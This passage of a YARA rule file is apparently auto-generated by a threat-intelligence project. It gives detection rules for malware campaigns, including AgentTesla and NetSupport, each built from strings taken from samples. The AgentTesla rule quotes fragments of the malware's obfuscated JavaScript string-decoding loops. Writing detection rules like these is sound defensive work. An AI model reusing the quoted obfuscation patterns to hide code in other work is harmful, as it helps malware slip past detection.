        $s1 = "i32i64f32f64StackOverflowMemoryOutOfBoundsHeapMisalignedTableOutOfBoundsIndirectCallToNullBadSignatu" ascii
        $s2 = "<assemblyIdentity version=\"1.0.0.0\" name=\"mozglue\" type=\"win32\"/>" ascii
        $s3 = "assertion failed: code < MAX_HUFF_SYMBOLS_2" ascii
        $s4 = "LazyLock instance has previously been poisoned_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/______" ascii
        $s5 = "eCalling Web API crypto.getRandomValues failedrandSecure: VxWorks RNG module is not initializedNode." ascii
        $s6 = "RandomCopyBytes: iOS Security framework failureRtlGenRandom: Windows system function failureRDRAND: " ascii
        $s7 = "assertion failed: self.is_char_boundary(new_len)_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
        $s8 = "a Display implementation returned an error unexpectedly_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f" ascii
        $s9 = "js crypto CommonJS module is unavailableCalling Node.js API crypto.randomFillSync failedNode.js ES m" ascii
        $s10 = "Utf8Errorvalid_up_toerror_lenNoneSomeAccessError_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
        $s11 = "?InvalidArrayIndex_CRASH@detail@mozilla@@YAX_K0@Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1309696 and 12 of them
}

rule Sightlines_tlsh_52e4e256_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-52e4e256"
        date = "2026-10-15"
        campaign = "tlsh-52e4e256"
        family = ""
        hash = "212ffc04072e2ef3ec7a97f347286522ddf0e89f4384b10e8b124d818177ccb2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-52e4e256.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "HelloExtensionWrongGroupForKeyShareUnsolicitedEchExtensionAES_128_GCMAES_256_GCMCHACHA20_POLY_1305EX" ascii
        $s1 = "SizeLimitExhaustedParseIntErrorInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee720" ascii
        $s2 = "PskKeyExchangeModeHpkeSymmetricCipherSuitekdf_idaead_idWebPkiSupportedAlgorithms { all: [ .. ], mapp" ascii
        $s3 = "assertion failed: len >= size_of::<c::sockaddr_in>()_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/" ascii
        $s4 = "i1\"AWouldBlockthread name may not contain interior null bytes_______ac68faa20c58cbccd01ee7208bf3b6e9" ascii
        $s5 = "RNG failedWrongAlgorithmInvalidEncodingUnexpectedErrorInvalidComponentPublicKeyIsMissingVersionNotSu" ascii
        $s6 = "ring::signature::ED25519assertion failed: key.len() <= digest_alg.block_len() / 2" ascii
        $s7 = "accept confirmationhrr ech accept confirmationCLIENT_EARLY_TRAFFIC_SECRETCLIENT_HANDSHAKE_TRAFFIC_SE" ascii
        $s8 = "SystemRandomRsaParameterspadding_algmin_bitsNoKeyLogCrlsRequiredRingTLS_NULL_WITH_NULL_NULLTLS_PSK_W" ascii
        $s9 = "LazyLock instance has previously been poisoned_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/______" ascii
        $s10 = "'..= | !nullboolcharstri8i16i32i64i128isizeu64u128usizef32f64!..._R__R" ascii
        $s11 = "assertion failed: self.is_char_boundary(new_len)_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3345408 and 12 of them
}

rule Sightlines_tlsh_237ed4c4_agenttesla
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-237ed4c4"
        date = "2026-10-15"
        campaign = "tlsh-237ed4c4"
        family = "agenttesla"
        hash = "21f53d2b3cf28862d7ecf4692993a6ea24f222c0d621d78254f826f575415c92"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-237ed4c4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "var _tmpx=[34,83,66,74,87,34],_tmpk=7,_tmp=\"\"; for(var _tmpi=0;_tmpi<_tmpx.length;_tmpi++)_tmp+=_xF(" ascii
        $s1 = "var _mtx=[72,96,113,109,106,97,118,90],_mtk=5,_mt=\"\"; for(var _mti=0;_mti<_mtx.length;_mti++)_mt+=_x" ascii
        $s2 = "var _swx=[87,108,107,115,83,109,106,96,107,115],_swk=4,_sw=\"\"; for(var _swi=0;_swi<_swx.length;_swi+" ascii
        $s3 = "var _dfx=[74,107,98,107,122,107,72,103,98,107],_dfk=14,_df=\"\"; for(var _dfi=0;_dfi<_dfx.length;_dfi+" ascii
        $s4 = "var hex = (value & 0xFFFF).toString(16).toUpperCase();" ascii
        $s5 = "var _itmx=[74,119,102,110],_itmk=3,_itm=\"\"; for(var _itmi=0;_itmi<_itmx.length;_itmi++)_itm+=_xF(_it" ascii
        $s6 = "var childAttribute = new NS_Mdl.Element();" ascii
        $s7 = "toyKey = secret.hexKey ? secret.toyKey : ((pmk[0] << 8) | pmk[1]) & 0xFFFF;" ascii
        $s8 = "var _ipx=[69,98,92,109,126,109,97,105,120,105,126,127],_ipk=12,_ip=\"\"; for(var _ipi=0;_ipi<_ipx.leng" ascii
        $s9 = "var ImportOverwriteMode = { Stubs: \"Stubs\", All: \"All\" };" ascii
        $s10 = "var attributes = new NS_Mdl.ElementArray();" ascii
        $s11 = "var _flrx=[111,101,102,102,123],_flrk=9,_flr=\"\"; for(var _flri=0;_flri<_flrx.length;_flri++)_flr+=_x" ascii
    condition:
        filesize < 1170342 and 12 of them
}

rule Sightlines_signer_cert_sha1_9325759a_netsupport
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-9325759a"
        date = "2026-10-15"
        campaign = "signer_cert_sha1-9325759a"
        family = "netsupport"
        hash = "06a0a243811e9c4738a9d413597659ca8d07b00f640b74adc9cb351c179b3268"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-9325759a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".Netsupport House Towngate East, Market Deeping1" ascii
        $s1 = "!Copyright (c) 2023 NetSupport Ltd" wide
        $s2 = "is@netsupportsoftware.com0" ascii
        $s3 = "Private Organization1" ascii
        $s4 = "NETSUPPORT LTD.1(0&" ascii
        $s5 = "Peterborough1705" ascii
        $s6 = "341209171340Z0]1" ascii
        $s7 = "250617130115Z0" ascii
        $s8 = "220617130115Z" ascii
        $s9 = "300728000000Z0\\1" ascii
        $s10 = "231107171340Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_rich_header_hash_6a7fcf10_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-6a7fcf10"
        date = "2026-10-15"
        campaign = "rich_header_hash-6a7fcf10"
        family = ""
        hash = "0e823fe2692ba740b73c8f0cc47f2d732ede3b17dd7d268219e7e1611b9ae239"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-6a7fcf10.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "tUH9\\$htN9\\$`~H" ascii
        $s1 = "H USVWATAUAVAWH" ascii
        $s2 = " BD8d$`t5M" ascii
        $s3 = "0uNH9|$@tG" ascii
        $s4 = "D$ H5J)n(H" ascii
        $s5 = "D$@H5`fZ8H" ascii
        $s6 = "D$pH5*UBoH" ascii
        $s7 = "D$pH50B|ZH" ascii
        $s8 = "HcD$`Hc\\$8H" ascii
        $s9 = "]ofD9\"t#H" ascii
        $s10 = "mKD9s ~yI" ascii
        $s11 = "xJL9l$PtC" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4399140 and 12 of them
}
